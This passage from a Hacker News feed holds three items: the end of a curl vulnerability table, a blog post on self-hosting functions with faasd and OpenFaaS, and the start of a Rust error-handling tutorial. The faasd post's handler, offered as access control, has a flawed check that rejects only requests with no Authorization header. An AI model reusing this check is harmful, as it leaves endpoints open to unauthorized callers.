        <td>24</td>
        <td>not verifying certs for TLS to IP address / Winssl</td>
        <td>Logic</td>
        <td>0</td>
      </tr>
      <tr>
        <td>23</td>
        <td>not verifying certs for TLS to IP address / Darwinssl</td>
        <td>Logic</td>
        <td>0</td>
      </tr>
      <tr>
        <td>22</td>
        <td>IP address wildcard certificate validation</td>
        <td>Logic</td>
        <td>0</td>
      </tr>
      <tr>
        <td>21</td>
        <td>wrong re-use of connections</td>
        <td>Logic</td>
        <td>0</td>
      </tr>
      <tr>
        <td>20</td>
        <td>re-use of wrong HTTP NTLM connection</td>
        <td>Logic, reuse</td>
        <td>2</td>
      </tr>
      <tr>
        <td>19</td>
        <td>cert name check ignore GnuTLS</td>
        <td>Logic</td>
        <td>0</td>
      </tr>
      <tr>
        <td>18</td>
        <td>cert name check ignore OpenSSL</td>
        <td>Logic</td>
        <td>0</td>
      </tr>
      <tr>
        <td>17</td>
        <td>URL decode buffer boundary flaw</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>16</td>
        <td>cookie domain tailmatch</td>
        <td>Logic</td>
        <td>0</td>
      </tr>
      <tr>
        <td>15</td>
        <td>SASL buffer overflow</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>14</td>
        <td>SSL CBC IV vulnerability</td>
        <td>Logic</td>
        <td>0</td>
      </tr>
      <tr>
        <td>13</td>
        <td>URL sanitization vulnerability</td>
        <td>Logic, parsing</td>
        <td>0</td>
      </tr>
      <tr>
        <td>12</td>
        <td>inappropriate GSSAPI delegation</td>
        <td>Logic</td>
        <td>0</td>
      </tr>
      <tr>
        <td>11</td>
        <td>local file overwrite</td>
        <td>Logic, parsing</td>
        <td>0</td>
      </tr>
      <tr>
        <td>10</td>
        <td>data callback excessive length</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>9</td>
        <td>embedded zero in cert name</td>
        <td>Logic, null-terminated strings</td>
        <td>4</td>
      </tr>
      <tr>
        <td>8</td>
        <td>Arbitrary File Access</td>
        <td>Logic</td>
        <td>0</td>
      </tr>
      <tr>
        <td>7</td>
        <td>GnuTLS insufficient cert verification</td>
        <td>Logic</td>
        <td>0</td>
      </tr>
      <tr>
        <td>6</td>
        <td>TFTP Packet Buffer Overflow</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>5</td>
        <td>URL Buffer Overflow</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>4</td>
        <td>NTLM Buffer Overflow</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>3</td>
        <td>Authentication Buffer Overflows</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>2</td>
        <td>Proxy Authentication Header Information Leakage</td>
        <td>Logic</td>
        <td>0</td>
      </tr>
      <tr>
        <td>1</td>
        <td>FTP Server Response Buffer Overflow</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
    </div></div>]]>
            </description>
            <link>https://timmmm.github.io/curl-vulnerabilities-rust/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25805576</guid>
            <pubDate>Sat, 16 Jan 2021 21:15:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How I discovered faasd and what it changed for me]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25805383">thread link</a>) | @alexellisuk
<br/>
January 16, 2021 | https://releasecandidate.dev/posts/2021/discovery-faasd-and-openfaas/ | <a href="https://web.archive.org/web/*/https://releasecandidate.dev/posts/2021/discovery-faasd-and-openfaas/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><article><p>Regularly, I discover myself thinking <em>"wow, that's so simple I can build this in a weekend"</em>. My rational brain kicks in at some point: <em>"Waaaaiiit a second, if it's so simple, why am I not seeing this done a million times?"</em>. Here I usually start better scoping and either find the answer to my question.</p><p>Often, my developer mind insists on "it's actually just two API endpoints and then I could do this and that". And often this holds true for the core functionality. If some <a href="https://peterthaleikis.com/business-idea-validation/">basic validation</a> gives a green light for working on it from a commercial perspective, I still need to consider the tech stack and marketing approach, as <a href="https://roadmap.sh/guides/why-build-it-and-they-will-come-wont-work-anymore">building alone doesn't do it</a>.</p><p>I'm not super fixed on the approach, my main goal is usually to keep long term overhead low. Laravel is my go-to solution for anything backend-heavy, but its power comes at a complexity cost too. For two little API endpoints used in, for example, a browser extension is a bit of an overkill.</p><p>Function as a service sounds like a great step towards "just having a few API endpoints". AWS Lambda is the name everyone is having in mind here. But any gains from simplicity are eaten up by AWS complexity. If you are new to AWS (Lambda), it easily takes you double or more time to get it running as you spend building the little lean function in the first place. This doesn't go well with the plan to "just chuck this out over the weekend".</p><h2 id="enter%3A-faasd">Enter: faasd <a href="#enter%3A-faasd">#</a></h2><p>Function as a Service should be easy. Here comes <a href="https://www.openfaas.com/blog/introducing-faasd/">faasd</a> into play. It's a self-hosted alternative to run functions. It allows you to run a simple copy &amp; paste installer script on your machine getting it up and running. It takes less than ten minutes to get to work. It's production-ready and helps to remove the learning curve involved with Kubernetes and co.</p><blockquote><p>faasd is a self-hosted alternative to AWS Lambda to run functions. Production-ready within minutes ‚è≤Ô∏è</p></blockquote><p>Once you have deployed your faasd instance, it's a matter of one command to push your function into production. From there it's up to you what you like to build. I catch myself breaking up the structure of larger applications in functions. It builds the container, publishes, and deploys your function code ready-to-use in seconds. To run this you will need the <a href="https://github.com/openfaas/faas-cli">FaaS CLI</a>. Again this is installed in under one minute thanks to copy and paste that just works.</p><p>Found a great library but it's written in the "wrong" language? Thanks to the flexibility, you can also jump between programming languages easily. I use a mix of nodejs, PHP, and Python by now.</p><blockquote><p>With functions you libraries aren't in the <em>wrong</em> language anymore.</p></blockquote><p>This helps to truly break up large applications into functional parts using the best tool for you. You can get a rich list of the official templates by running:</p><pre><code>$ faas-cli template store list<p>NAME                     SOURCE             DESCRIPTION<br>csharp                   openfaas           Classic C<br>dockerfile               openfaas           Classic Dockerfile template<br>go                       openfaas           Classic Golang template<br>java8                    openfaas           Java <span>8</span> template<br>java11                   openfaas           Java <span>11</span> template<br>java11-vert-x            openfaas           Java <span>11</span> Vert.x template<br>node12                   openfaas           HTTP-based Node <span>12</span> template<br>node                     openfaas           Classic NodeJS <span>8</span> template<br>php7                     openfaas           Classic PHP <span>7</span> template<br>python                   openfaas           Classic Python <span>2.7</span> template<br>python3                  openfaas           Classic Python <span>3.6</span> template<br>python3-dlrs             intel              Deep Learning Reference Stack v0.4 <span>for</span> ML workloads<br>ruby                     openfaas           Classic Ruby <span>2.5</span> template<br>ruby-http                openfaas           Ruby <span>2.4</span> HTTP template<br>python27-flask           openfaas           Python <span>2.7</span> Flask template<br>python3-flask            openfaas           Python <span>3.7</span> Flask template<br>python3-flask-debian     openfaas           Python <span>3.7</span> Flask template based on Debian<br>python3-http             openfaas           Python <span>3.7</span> with Flask and HTTP<br>python3-http-debian      openfaas           Python <span>3.7</span> with Flask and HTTP based on Debian<br>golang-http              openfaas           Golang HTTP template<br>golang-middleware        openfaas           Golang Middleware template<br>python3-debian           openfaas           Python <span>3</span> Debian template<br>powershell-template      openfaas-incubator Powershell Core Ubuntu:16.04 template<br>powershell-http-template openfaas-incubator Powershell Core HTTP Ubuntu:16.04 template<br>rust                     booyaa             Rust template<br>crystal                  tpei               Crystal template<br>csharp-httprequest       distantcam         C<br>csharp-kestrel           burtonr            C<br>vertx-native             pmlopes            Eclipse Vert.x native image template<br>swift                    affix              Swift <span>4.2</span> Template<br>lua53                    affix              Lua <span>5.3</span> Template<br>vala                     affix              Vala Template<br>vala-http                affix              Non-Forking Vala Template<br>quarkus-native           pmlopes            Quarkus.io native image template<br>perl-alpine              tmiklas            Perl language template based on Alpine image<br>crystal-http             koffeinfrei        Crystal HTTP template<br>rust-http                openfaas-incubator Rust HTTP template<br>bash-streaming           openfaas-incubator Bash Streaming template<br>cobol                    devries            COBOL Template</p></code></pre><p>There are also inofficial templates you can find with a bit of research on GitHub.</p><p>Start with a new function by running:</p><pre><code>faas-cli new function-name --lang node12</code></pre><p>This creates a function based on the node12 template. Now you can develop the function in the <code>handler.js</code>-file. This approach works similarly for all other functions. Once you ready run <code>faas-cli up</code> to deploy the function.</p><h2 id="building-a-function">Building a Function <a href="#building-a-function">#</a></h2><p>I like to learn by doing. So I started by building a simple <a href="https://github.com/spekulatius/faasd-franc">function to detect the language</a> of a given string. The <a href="https://github.com/spekulatius/faasd-franc/blob/master/franc/handler.js">whole function</a> including access control is only 31 lines with plenty of space:</p><pre><code><span>'use strict'</span><p><span>const</span> fs <span>=</span> <span>require</span><span>(</span><span>'fs'</span><span>)</span><br><span>const</span> fsPromises <span>=</span> fs<span>.</span>promises<br><span>let</span> franc <span>=</span> <span>require</span><span>(</span><span>'franc'</span><span>)</span></p><p>module<span>.</span><span>exports</span> <span>=</span> <span>async</span> <span>(</span><span>event<span>,</span> context</span><span>)</span> <span>=&gt;</span> <span>{</span><br>  <br>  <span>let</span> secret <span>=</span> <span>await</span> fsPromises<span>.</span><span>readFile</span><span>(</span><span>"/var/openfaas/secrets/franc-token"</span><span>,</span> <span>"utf8"</span><span>)</span><br>  <span>let</span> auth <span>=</span> event<span>.</span>headers<span>[</span><span>"authorization"</span><span>]</span><br>  <span>if</span><span>(</span><span>!</span>auth <span>&amp;&amp;</span> auth <span>!=</span> <span>"Bearer: "</span> <span>+</span> secret<span>)</span> <span>{</span><br>    <span>return</span> context<br>      <span>.</span><span>status</span><span>(</span><span>403</span><span>)</span><br>      <span>.</span><span>headers</span><span>(</span><span>{</span><span>"Content-Type"</span><span>:</span> <span>"application/json"</span><span>}</span><span>)</span><br>      <span>.</span><span>succeed</span><span>(</span><span>{</span><span>"status"</span><span>:</span> <span>"Unauthorized"</span><span>}</span><span>)</span><br>  <span>}</span></p><p>  <span>let</span> response <span>=</span> <span>{</span><span>}</span><br>  <span>if</span> <span>(</span>event<span>.</span>query<span>.</span>query <span>==</span> <span>undefined</span> <span>||</span> event<span>.</span>query<span>.</span>query<span>.</span>length <span>==</span> <span>0</span><span>)</span> <span>{</span><br>    response<span>.</span>status <span>=</span> <span>'Error'</span><br>    response<span>.</span>message <span>=</span> <span>'No query string provided'</span><br>  <span>}</span> <span>else</span> <span>{</span><br>    response<span>.</span>status <span>=</span> <span>'Success'</span><br>    response<span>.</span>result <span>=</span> franc<span>.</span><span>all</span><span>(</span>event<span>.</span>query<span>.</span>query<span>)</span><span>.</span><span>splice</span><span>(</span><span>0</span><span>,</span> <span>10</span><span>)</span><br>  <span>}</span></p><p>  <span>return</span> context<br>    <span>.</span><span>status</span><span>(</span><span>200</span><span>)</span><br>    <span>.</span><span>headers</span><span>(</span><span>{</span><span>"Content-Type"</span><span>:</span> <span>"application/json"</span><span>}</span><span>)</span><br>    <span>.</span><span>succeed</span><span>(</span>response<span>)</span><br><span>}</span></p></code></pre><p>Functions as a service are made for this: You can easily try out a library or different programming language as it's made to be disposable. Don't like how it's going? Drop it, delete the function and your system is clean once more. No compilers, dependencies, and other tooling remain on your system.</p><h2 id="lessons-learned-along-the-way">Lessons learned along the way <a href="#lessons-learned-along-the-way">#</a></h2><p>At the beginning, I didn't want to run my own container registry. I expected additional overhead and "another thing to maintain". This turned out to be a mistake, as the setup was almost as easy as faasd itself. Plus, the performance is much better than relying on Docker Hub.</p><p>I got it up and running on my <a href="https://peterthaleikis.com/hetzner">Hetzner server</a> in a few minutes using some guides from <a href="https://peterthaleikis.com/digitalocean">DigitalOcean</a>.</p><p>After spinning up your server, the steps break down to:</p><ul><li><a href="https://docs.docker.com/engine/install/ubuntu/">installing docker</a>,</li><li>setting up the <a href="https://www.digitalocean.com/community/tutorials/how-to-set-up-a-private-docker-registry-on-ubuntu-18-04">container registry</a>, and</li><li><a href="https://www.digitalocean.com/community/tutorials/how-to-set-up-a-private-docker-registry-on-ubuntu-18-04">securing nginx</a>.</li></ul><p>Another really interesting option is <a href="https://get-arkade.dev/">arkade</a>. It allows you to abstract the steps.</p><p>I should have also paid closer attention to the <a href="https://github.com/openfaas/workshop/">OpenFaaS workshop</a> at the beginning. It guides you through the basics with examples better than purely self-discovery does. This is especially true for me, as I'm not deep in the serverless space.</p><h2 id="worry-about-scaling%2C-when-you-get-to-scale">Worry about scaling, when you get to scale <a href="#worry-about-scaling%2C-when-you-get-to-scale">#</a></h2><p>As with any solution approach, there are limitations. For the most time, I leave these concerns out. It simply doesn't matter if my functions can scale to millions of users, as I don't have millions of users. Migrating to a more scalable approach such as <a href="https://github.com/openfaas/openfaas-cloud">OpenFaaS Cloud</a> should be very doable.</p><blockquote><p>Worry about scaling, when you get to scale. Until then build and market.</p></blockquote><p>We can probably agree: The people behind a project matter to its success for a large part. The OpenFaaS project is driven by <a href="https://blog.alexellis.io/">Alex Ellis</a>, a passionate developer. He and the contributors maintain an active slack channel - questions from newbie-level to expert find answers there. Alex is supporting this effort with contracting, but other options such as sponsorship of <a href="https://github.com/sponsors/openfaas">OpenFaaS</a> or <a href="https://github.com/sponsors/alexellis">Alex</a> directly are available (and recommended).</p><h2 id="get-playing">Get Playing <a href="#get-playing">#</a></h2><p>As with any reading: It can only take you so far. Make sure to put a few hours aside and check out faasd! It does come with a little overhead to learn and keep up. Especially for independent developers eyeing to monetize an API or build a small SaaS this could be a great solution.</p><ul><li>Head over to <a href="https://github.com/openfaas/faasd">faasd</a>! Feel free to star or fork the project on GitHub!</li><li>If you like to discover new open-source projects and see how you could apply them, <a href="https://twitter.com/spekulatius1984">follow me on Twitter</a> and <a href="https://buttondown.email/spekulatius">sign up for my newsletter</a>.</li></ul><p>Want to dive in proper? Check out the <a href="https://gumroad.com/a/998896755">"serverless for the rest of us" ebook</a> by OpenFaaS-developer Alex Ellis.</p><p>Since you've made it this far, <a href="https://releasecandidate.dev/posts/2021/discovery-faasd-and-openfaas/" on-click="share">sharing</a> this article on your favorite social media network would be highly appreciated üíñ! For feedback, please <a href="https://twitter.com/spekulatius1984" rel="noopener" target="_blank">ping me on Twitter.</a></p><share-widget></share-widget><p>Published <time datetime="2021-01-13">13 Jan 2021</time></p></article></div></div>]]>
            </description>
            <link>https://releasecandidate.dev/posts/2021/discovery-faasd-and-openfaas/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25805383</guid>
            <pubDate>Sat, 16 Jan 2021 20:50:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Rust: Structuring and handling errors in 2020 (2020)]]>
            </title>
            <description>
<![CDATA[
Score 131 | Comments 14 (<a href="https://news.ycombinator.com/item?id=25805340">thread link</a>) | @arm
<br/>
January 16, 2021 | https://nick.groenen.me/posts/rust-error-handling/ | <a href="https://web.archive.org/web/*/https://nick.groenen.me/posts/rust-error-handling/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <p>I recently started learning the <a href="https://www.rust-lang.org/">Rust programming language</a> by going through <em>"<a href="https://doc.rust-lang.org/book/">the book</a>"</em>, which does a phenomenal job of explaining the language basics.</p>
<p>After working through the book‚Äôs main content I got started with my first non-trivial, real-world application.
But I soon found myself faced with a question I didn‚Äôt yet feel well-equipped to handle:</p>
<blockquote>
<p><em>‚ÄúHow should you structure error handling in a mature rust application?"</em></p>
</blockquote>
<p>This article describes my journey of discovering the answer to this question.
I will try to explain the pattern I‚Äôve settled on together with example code showing its implementation, in the hope that other newcomers may have an easier time getting started.</p>
<h2 id="contents">Contents</h2>

<nav id="TableOfContents">
  <ul>
    <li><a href="#intro">Intro</a></li>
    <li><a href="#counting-words">Counting words</a>
      <ul>
        <li><a href="#missing-context">Missing context</a></li>
      </ul>
    </li>
    <li><a href="#libraries-versus-applications">Libraries versus applications</a>
      <ul>
        <li><a href="#api-boundaries">API boundaries</a></li>
        <li><a href="#the-library-error-type">The library error type</a></li>
        <li><a href="#returning-library-errors">Returning library errors</a></li>
        <li><a href="#application-errors">Application errors</a></li>
      </ul>
    </li>
    <li><a href="#backtraces">Backtraces</a></li>
    <li><a href="#conclusion">Conclusion</a></li>
    <li><a href="#feedback-and-conversations">Feedback and conversations</a></li>
  </ul>
</nav>

<h2 id="intro">Intro</h2>
<p>While the book goes through the basics of error handling, including use of the <a href="https://doc.rust-lang.org/std/result/">std::Result</a> type and error propagation with the <a href="https://doc.rust-lang.org/book/ch09-02-recoverable-errors-with-result.html#a-shortcut-for-propagating-errors-the--operator"><code>?</code></a> operator, it largely glosses over the different patterns for using these tools in real-world applications or the trade-offs involved with different approaches. <sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup></p>
<p>When I began looking into best practices, I came across quite a bit of outdated advice to use the <a href="https://github.com/rust-lang-nursery/failure/"><em>failure</em> crate</a>.
<em>Failure</em> had a semi-official feel to it as a result of being in the <code>rust-lang-nursery</code> namespace, but <a href="https://github.com/rust-lang-nursery/failure/pull/347">it has recently been deprecated</a>.</p>
<p>There have been a number of improvements to the <a href="https://doc.rust-lang.org/std/error/trait.Error.html">std::error::Error</a> trait in the past two years. <sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>
These have made <em>failure</em> less needed in general and have sparked a number of more modern libraries taking advantage of these improvements to offer better ergonomics.</p>
<p>After reading through quite a lot of historical context and evaluating a number of libraries, I‚Äôve now settled on a (largely library-agnostic) pattern for structuring errors, which I implement using the <a href="https://crates.io/crates/anyhow">anyhow</a> and <a href="https://crates.io/crates/thiserror">thiserror</a> crates. <sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup></p>
<p>The rest of this article will:</p>
<ol>
<li>Introduce a relatively trivial word-counting application to explore and explain the problem space.</li>
<li>Explain why applications and libraries should use different error-handling patterns.</li>
<li>Demonstrate how to apply these patterns using <code>anyhow</code> and <code>thiserror</code>.</li>
</ol>
<h2 id="counting-words">Counting words</h2>
<p>Let‚Äôs introduce some example code for use throughout the rest of this article.
We‚Äôll build a program to count the number of words in a text file, much like <a href="http://man7.org/linux/man-pages/man1/wc.1.html">wc -w</a> would do.</p>
<p>A naive implementation with basic error handling using <a href="https://doc.rust-lang.org/std/result/">std::Result</a> might look like this:</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span> 1
</span><span> 2
</span><span> 3
</span><span> 4
</span><span> 5
</span><span> 6
</span><span> 7
</span><span> 8
</span><span> 9
</span><span>10
</span><span>11
</span><span>12
</span><span>13
</span><span>14
</span><span>15
</span><span>16
</span><span>17
</span><span>18
</span><span>19
</span><span>20
</span><span>21
</span><span>22
</span><span>23
</span><span>24
</span><span>25
</span><span>26
</span><span>27
</span><span>28
</span><span>29
</span><span>30
</span><span>31
</span></code></pre></td>
<td>
<pre><code data-lang="rust"><span>use</span><span> </span><span>std</span>::<span>env</span><span>;</span><span>
</span><span></span><span>use</span><span> </span><span>std</span>::<span>error</span>::<span>Error</span><span>;</span><span>
</span><span></span><span>use</span><span> </span><span>std</span>::<span>fs</span>::<span>File</span><span>;</span><span>
</span><span></span><span>use</span><span> </span><span>std</span>::<span>io</span>::<span>prelude</span>::<span>*</span><span>;</span><span>
</span><span></span><span>use</span><span> </span><span>std</span>::<span>io</span>::<span>BufReader</span><span>;</span><span>
</span><span>
</span><span></span><span>/// Count the number of words in the given input.
</span><span>///
</span><span>/// Any potential errors, such as being unable to read from the input will be propagated
</span><span>/// upwards as-is due to the use of `line?` just before `split_whitespace()`.
</span><span></span><span>fn</span> <span>count_words</span><span>&lt;</span><span>R</span>: <span>Read</span><span>&gt;</span><span>(</span><span>input</span>: <span>&amp;</span><span>mut</span><span> </span><span>R</span><span>)</span><span> </span>-&gt; <span>Result</span><span>&lt;</span><span>u32</span><span>,</span><span> </span><span>Box</span><span>&lt;</span><span>dyn</span><span> </span><span>Error</span><span>&gt;&gt;</span><span> </span><span>{</span><span>
</span><span>    </span><span>let</span><span> </span><span>reader</span><span> </span><span>=</span><span> </span><span>BufReader</span>::<span>new</span><span>(</span><span>input</span><span>);</span><span>
</span><span>    </span><span>let</span><span> </span><span>mut</span><span> </span><span>wordcount</span><span> </span><span>=</span><span> </span><span>0</span><span>;</span><span>
</span><span>    </span><span>for</span><span> </span><span>line</span><span> </span><span>in</span><span> </span><span>reader</span><span>.</span><span>lines</span><span>()</span><span> </span><span>{</span><span>
</span><span>        </span><span>for</span><span> </span><span>_word</span><span> </span><span>in</span><span> </span><span>line</span><span>?</span><span>.</span><span>split_whitespace</span><span>()</span><span> </span><span>{</span><span>
</span><span>            </span><span>wordcount</span><span> </span><span>+=</span><span> </span><span>1</span><span>;</span><span>
</span><span>        </span><span>}</span><span>
</span><span>    </span><span>}</span><span>
</span><span>    </span><span>Ok</span><span>(</span><span>wordcount</span><span>)</span><span>
</span><span></span><span>}</span><span>
</span><span>
</span><span></span><span>fn</span> <span>main</span><span>()</span><span> </span>-&gt; <span>Result</span><span>&lt;</span><span>(),</span><span> </span><span>Box</span><span>&lt;</span><span>dyn</span><span> </span><span>Error</span><span>&gt;&gt;</span><span> </span><span>{</span><span>
</span><span>    </span><span>for</span><span> </span><span>filename</span><span> </span><span>in</span><span> </span><span>env</span>::<span>args</span><span>().</span><span>skip</span><span>(</span><span>1</span><span>).</span><span>collect</span>::<span>&lt;</span><span>Vec</span><span>&lt;</span><span>String</span><span>&gt;&gt;</span><span>()</span><span> </span><span>{</span><span>
</span><span>        </span><span>let</span><span> </span><span>mut</span><span> </span><span>reader</span><span> </span><span>=</span><span> </span><span>File</span>::<span>open</span><span>(</span><span>&amp;</span><span>filename</span><span>)</span><span>?</span><span>;</span><span>
</span><span>
</span><span>        </span><span>let</span><span> </span><span>wordcount</span><span> </span><span>=</span><span> </span><span>count_words</span><span>(</span><span>&amp;</span><span>mut</span><span> </span><span>reader</span><span>)</span><span>?</span><span>;</span><span>
</span><span>        </span><span>println</span><span>!</span><span>(</span><span>"{} {}"</span><span>,</span><span> </span><span>wordcount</span><span>,</span><span> </span><span>filename</span><span>);</span><span>
</span><span>    </span><span>}</span><span>
</span><span>
</span><span>    </span><span>Ok</span><span>(())</span><span>
</span><span></span><span>}</span><span>
</span></code></pre></td></tr></tbody></table>
</div>
</div><p>Let‚Äôs generate an input file for our new word counter and try to run it:</p>
<pre><code>$ fortune &gt; words.txt
$ cargo run --quiet -- words.txt
50 words.txt
</code></pre><p>If you don‚Äôt have a <code>words.txt</code> however, you‚Äôll encounter the following error:</p>
<pre><code>$ cargo run --quiet -- words.txt
Error: Os { code: 2, kind: NotFound, message: "No such file or directory" }
</code></pre><p>This error is the result of <code>File::open()</code> returning an error in <code>main()</code>.</p>
<p>To make the example complete, let‚Äôs also <a href="https://github.com/zoni/rust-wordcount/blob/36f4545f2b994f054a17ac31df07e2f762c6ac24/src/wordcounter.rs#L124-L125">simulate an error</a> in the <code>read()</code> call happening under the hood inside <code>count_words()</code> <sup id="fnref:4"><a href="#fn:4" role="doc-noteref">4</a></sup> so we can see what that looks like:</p>
<pre><code>$ cargo run --quiet -- words.txt
Error: Custom { kind: BrokenPipe, error: "read: broken pipe" }
</code></pre><h3 id="missing-context">Missing context</h3>
<p>So what‚Äôs wrong with the above error?
While the underlying error cause (<em>‚Äúbroken pipe‚Äù</em>) is made clear, we‚Äôre missing a lot of context.
We can‚Äôt tell which file could not be opened and there is no information about the sequence of events leading up to this error.</p>
<p>When you think about it, there‚Äôs a chain of errors here:</p>
<ul>
<li><code>main()</code> returns an error because <code>count_words()</code> returns an error.</li>
<li><code>count_words()</code> returns an error because we run into an error iterating over <code>reader.lines()</code> (lines 14-15).</li>
<li>Iterating over <code>reader.lines()</code> errors because we injected an implementation of <code>std::io::Read</code> that fails on the first call to <code>read()</code>.</li>
</ul>
<p>However, we don‚Äôt really see this reflected in the error messages above.</p>
<p>In this example the file name is an input argument for the program itself.
This makes it easy to correlate the error to the file it was trying to open.</p>
<p>Now imagine an error happening 5 calls deep inside a library within a much larger piece of software.
Without any information on the chain of events in such a case, it quickly gets very difficult to understand what might be causing the error.</p>
<h2 id="libraries-versus-applications">Libraries versus applications</h2>
<p>Earlier on I mentioned <strong>two</strong> different libraries, <a href="https://crates.io/crates/anyhow">anyhow</a> and <a href="https://crates.io/crates/thiserror">thiserror</a> (though both are by the same author, <a href="https://rustaceans.org/search/dtolnay">dtolnay</a>).
You might be wondering why we need two separate libraries to do something as basic as dealing with errors.</p>
<p>It took me a moment to appreciate this distinction, but there‚Äôs value in approaching error handling differently between libraries and applications as they tend to have different concerns:</p>
<ul>
<li>Libraries should focus on <em>producing</em> meaningful, structured error types/variants.
This allows applications to easily differentiate various error cases.</li>
<li>Applications mainly <em>consume</em> errors.</li>
<li>Libraries may want to cast errors from one type to another.
An IO error should likely be wrapped by a high-level error type provided by the library.
<ul>
<li>Otherwise an IO error in library <code>foo</code> cannot be distinguished from a similar IO error in library <code>bar</code>.</li>
<li>Not doing so also requires the consumer to know library internals.
For example, is it just IO errors that might be returned? What about HTTP errors that might originate from an HTTP client internal to the library?</li>
</ul>
</li>
<li>Libraries must be careful when changing errors or creating new errors, as these can easily introduce breaking changes for consumers.
They may produce new errors internally, but these are unlikely to require special structure and can be more easily changed at will.</li>
<li>Where libraries return errors, applications decide if and how those errors are formatted and displayed to users.</li>
<li>Applications may also want to parse and inspect errors, for example to forward them to exception tracking services or to retry operations when doing so is deemed to be safe.</li>
</ul>
<p>Additionally, and I think this is quite important, <strong>libraries should always use <a href="https://doc.rust-lang.org/std/result/">std::Result</a> together with an error type implementing <a href="https://doc.rust-lang.org/std/error/trait.Error.html">std::error::Error</a> in their public APIs</strong>.
Custom result types like <a href="https://docs.rs/failure/0.1.8/failure/trait.Fail.html">failure::Fail</a> may not compose well with other parts of your user‚Äôs code and force them to learn yet another library.</p>
<h3 id="api-boundaries">API boundaries</h3>
<p>Coming back to our word counting example, imagine we want to make <code>count_words</code> available as a public library.
You wouldn‚Äôt normally do this for such a small and simple piece of code, but there can be value in making functionality available through public crates within larger projects.</p>
<p>As a demonstration, we can define boundaries in our word counter to separate this code into a library and an application part.</p>
<p>We‚Äôll extract <code>count_words</code> into a <em>library crate</em> named <em>wordcounter</em>.
I‚Äôll highlight relevant parts below, but if you want to skip ahead, you can find the complete <a href="https://github.com/zoni/rust-wordcount/blob/master/src/wordcounter.rs">src/wordcounter.rs</a> on GitHub.</p>
<p>Everything outside of <code>count_words</code> is our application code.
This is going to live in a <em>binary crate</em> which we‚Äôll call <em>rwc</em> (for <em>Rust Word Count</em> ‚Äî very original, I know).
The relevant files for this are <a href="https://github.com/zoni/rust-wordcount/blob/master/src/main.rs">src/main.rs</a> and <a href="https://github.com/zoni/rust-wordcount/blob/master/src/lib.rs">src/lib.rs</a>.</p>
<h3 id="the-library-error-type">The library error type</h3>
<p>For our <em>wordcounter</em> library, we‚Äôll define a top-level error type called <a href="https://github.com/zoni/rust-wordcount/blob/36db340c9beaf14032c93f63afcb413f99ec3291/src/wordcounter.rs#L23-L38">WordCountError</a>.
This enum has error variants for every possible error that our library might encounter.</p>
<p>This is where <a href="https://crates.io/crates/thiserror">thiserror</a> comes into play.
While we could implement this by hand, <em>thiserror</em> allows us to avoid writing lots of boilerplate code:</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span> 1
</span><span> 2
</span><span> 3
</span><span> 4
</span><span> 5
</span><span> 6
</span><span> 7
</span><span> 8
</span><span> 9
</span><span>10
</span><span>11
</span><span>12
</span><span>13
</span><span>14
</span><span>15
</span><span>16
</span><span>17
</span><span>18
</span></code></pre></td>
<td>
<pre><code data-lang="rust"><span>use</span><span> </span><span>thiserror</span>::<span>Error</span><span>;</span><span>
</span><span>
</span><span></span><span>/// WordCountError enumerates all possible errors returned by this library.
</span><span></span><span>#[derive(Error, Debug)]</span><span>
</span><span></span><span>pub</span><span> </span><span>enum</span> <span>WordCountError</span><span> </span><span>{</span><span>
</span><span>    </span><span>/// Represents an empty source. For example, an empty text file being given
</span><span></span><span>    </span><span>/// as input to `count_words()`.
</span><span></span><span>    </span><span>#[error(</span><span>"Source contains no data"</span><span>)]</span><span>
</span><span>    </span><span>EmptySource</span><span>,</span><span>
</span><span>
</span><span>    </span><span>/// Represents a failure to read from input.
</span><span></span><span>    </span><span>#[error(</span><span>"Read error"</span><span>)]</span><span>
</span><span>    </span><span>ReadError</span><span> </span><span>{</span><span> </span><span>source</span>: <span>std</span>::<span>io</span>::<span>Error</span><span> </span><span>},</span><span>
</span><span>
</span><span>    </span><span>/// Represents all other cases of `std::io::Error`.
</span><span></span><span>    </span><span>#[error(transparent)]</span><span>
</span><span>    </span><span>IOError</span><span>(</span><span>#[from]</span><span> </span><span>std</span>::<span>io</span>::<span>Error</span><span>),</span><span>
</span><span></span><span>}</span><span>
</span></code></pre></td></tr></tbody></table>
</div>
</div><p>(Quoting the official documentation: <em>‚ÄúThiserror deliberately does not appear in your public API. You get the same thing as if you had written an implementation of <code>std::error::Error</code> by hand, and switching from handwritten impls to thiserror or vice versa is not a breaking change."</em>)</p>
<p>With this error type, we can now change the signature of <code>count_words</code> as follows:</p>
<div><pre><code data-lang="rust"><span>fn</span> <span>count_words</span><span>&lt;</span><span>R</span>: <span>Read</span><span>&gt;</span><span>(</span><span>input</span>: <span>&amp;</span><span>mut</span><span> </span><span>R</span><span>)</span><span> </span>-&gt; <span>Result</span><span>&lt;</span><span>u32</span><span>,</span><span> </span><span>WordCountError</span><span>&gt;</span><span> </span><span>{</span><span> </span><span>/* .. */</span><span> </span><span>}</span><span>
</span></code></pre></div><p>Remember previously, the signature looked like this:</p>
